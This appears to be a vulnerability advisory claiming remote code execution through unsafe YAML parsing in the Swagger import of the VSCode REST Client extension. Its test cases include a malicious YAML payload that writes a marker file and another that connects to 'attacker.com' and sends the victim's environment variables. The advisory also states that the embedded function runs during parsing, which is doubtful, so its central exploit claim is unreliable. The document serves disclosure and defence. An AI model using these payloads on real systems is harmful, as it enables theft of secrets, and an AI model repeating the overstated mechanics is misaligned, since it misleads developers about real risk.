# Vulnerabilities in VSCode REST Client

## Remote Code Execution via Unsafe YAML Parsing in Swagger Import

### Description
The REST Client extension includes functionality to import Swagger/OpenAPI definitions through the `SwaggerUtils` class. Looking at the implementation in `swaggerUtils.ts`, the extension uses the `yaml.load()` function to parse YAML content without providing safety options:

```typescript
parseOpenApiYaml(data: string): string | undefined {
    try {
        const openApiYaml = yaml.load(data);
        return this.generateRestClientOutput(openApiYaml);
    } catch (error) {
        throw error;
    }
}
```

This is a critical security flaw because the standard `yaml.load()` function in js-yaml (without safety options) allows deserialization of arbitrary JavaScript types, including custom types that can execute code.

Step by step to trigger the vulnerability:
1. The attacker creates a specially crafted Swagger/OpenAPI YAML file that embeds malicious payload(s) using custom tags (for example, `!!js/function`).
2. The attacker distributes a repository containing this malicious YAML file.
3. The victim, while exploring the repository with the VS Code REST Client extension installed, invokes the "Import Swagger" command (registered as `rest-client.import-swagger`).
4. The file-open dialog is presented, and the victim selects the attacker-controlled file.
5. The extension reads this file and calls `yaml.load(data)` without any safe loading measures.
6. The malicious YAML payload is deserialized and executed, allowing arbitrary commands to be run on the victim's system.

### Impact
This vulnerability allows arbitrary code execution in the context of the VSCode process. An attacker could:
- Access and exfiltrate sensitive files and data from the victim's system
- Install malware or backdoors
- Potentially gain persistent access to the victim's development environment
- Modify source code in the victim's repositories
- Execute arbitrary commands with the same permissions as the VS Code process

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
None. The code uses `yaml.load()` without safety options or schema restrictions.

### Missing Mitigations
- Replace `yaml.load()` with `yaml.safeLoad()` or `yaml.load()` with the `{ schema: yaml.SAFE_SCHEMA }` option
- Implement content validation of YAML before processing
- Use a sandbox or separate process for parsing untrusted YAML content
- Validate or sanitize the Swagger file content before parsing
- Enforce a strict, restricted schema to prevent the instantiation of arbitrary objects
- Provide a user warning regarding the risks of importing YAML files from untrusted sources

### Preconditions
- Victim must have the REST Client extension installed
- Victim must manually trigger the Swagger import functionality (via the "Import Swagger" command)
- The attacker must supply a repository containing a malicious Swagger/OpenAPI YAML file
- The victim must select and import the malicious file when prompted by the file-open dialog

### Source Code Analysis
The vulnerability is in the `parseOpenApiYaml` method in `swaggerUtils.ts`. The function takes an untrusted string as input and passes it directly to `yaml.load()`:

```typescript
parseOpenApiYaml(data: string): string | undefined {
    try {
        const openApiYaml = yaml.load(data);
        return this.generateRestClientOutput(openApiYaml);
    } catch (error) {
        throw error;
    }
}
```

By default, `yaml.load()` in js-yaml allows deserialization of arbitrary JavaScript types. For example, a malicious YAML file could include code like:

```yaml
constructor: !<tag:yaml.org,2002:js/function> >
  function() {
    return require('child_process').execSync('malicious command').toString();
  }
```

When this is parsed by `yaml.load()`, it will create a JavaScript function that executes system commands and then execute it.

The parsed object is then passed to `generateRestClientOutput()`, but by then the code has already been executed during the parsing phase.

The [js-yaml documentation](https://github.com/nodeca/js-yaml) notes that using `load()` on untrusted input may lead to code execution because it supports arbitrary object construction. Since this function is invoked when the user imports a Swagger file, any malicious payload in the YAML file is deserialized and executed.

### Security Test Case
1. Create a malicious YAML file with the following content:
```yaml
swagger: '2.0'
info:
  title: Malicious API
  version: '1.0'
servers:
  - url: https://example.com/api
paths:
  /test:
    get:
      summary: Test endpoint
someKey: !!js/function >
  function () { require('fs').writeFileSync('/tmp/pwned.txt', 'compromised'); }
```

2. Place the malicious YAML file in a test repository that a user might open
3. In VS Code (with the REST Client extension installed), run the "Import Swagger" command (`rest-client.import-swagger`)
4. When the file-open dialog appears, select the malicious YAML file
5. Verify whether the malicious code executes (for example, by checking if the file `/tmp/pwned.txt` is created)
6. If the malicious code is executed, this confirms that the Swagger import feature is vulnerable to arbitrary code execution

Alternatively, a more network-oriented test:
1. Create a malicious YAML file with network exfiltration capabilities:
```yaml
swagger: '2.0'
info:
  title: Malicious API
  version: '1.0'
constructor: !<tag:yaml.org,2002:js/function> >
  function() {
    const process = require('process');
    const net = require('net');
    const client = net.connect({host: 'attacker.com', port: 8080}, () => {
      client.write(JSON.stringify(process.env));
    });
    return {};
  }
```

2. Set up a listener on attacker.com:8080 to receive the data
3. Have a victim with the REST Client extension import this YAML file
4. Verify that the listener receives environment variable data from the victim's system